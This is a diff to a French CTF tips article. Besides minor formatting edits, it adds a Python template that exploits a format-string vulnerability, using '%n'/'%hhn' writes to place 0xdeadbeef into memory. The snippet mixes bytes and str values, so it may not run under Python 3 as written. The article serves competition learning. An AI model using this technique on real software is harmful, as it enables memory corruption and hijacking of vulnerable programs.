@@ -1,6 +1,6 @@
 # Tips & Tricks : CTF
 
-<p style="text-align: right">_- last update 17/09/2021 -_</p>
+<p style="text-align: right">_- last update 21/09/2021 -_</p>
 
 Cet article est voué à évoluer régulièrement. Il me permet de regrouper les
 quelques informations que je juge intéressantes à propos de la résolution de
@@ -10,10 +10,10 @@ rapidement pendant les compétitions.
 
 ## Summary
 
-- [Cheat Sheet](#cheat-sheet)
+1. [Cheat Sheet](#cheat-sheet)
   - [C (lang)](#c-lang)
   - [Python 3](#python-3)
-- [Examples](#examples)
+2. [Examples](#examples)
   - [Pwntools Templates](#pwntools-templates)
 
 ## Cheat Sheet
@@ -146,4 +146,34 @@ print(conn.recvline().decode())
 conn.sendline(payload)
 print(conn.recvline().decode())
 print(conn.recvline().decode())
+```
+
+### Pure python template
+
+Exploiting format string's `%n` to write in memory:
+
+```python
+import struct
+import sys
+
+addr = int(sys.argv[1], 16)
+payload  = struct.pack("I", addr + 2) # ad
+payload += struct.pack("I", addr + 1) # be
+payload += struct.pack("I", addr + 3) # de
+payload += struct.pack("I", addr) # ef
+payload += b'%x-' * 8
+
+payload += 'a' * (0xad - len(payload) - 26)
+payload += '%hhn'
+
+payload += 'a' * (0xbe - 0xad)
+payload += '%hhn'
+
+payload += 'a' * (0xde - 0xbe)
+payload += '%hhn'
+
+payload += 'a' * (0xef - 0xde)
+payload += '%hhn'
+
+print(payload)
 ```
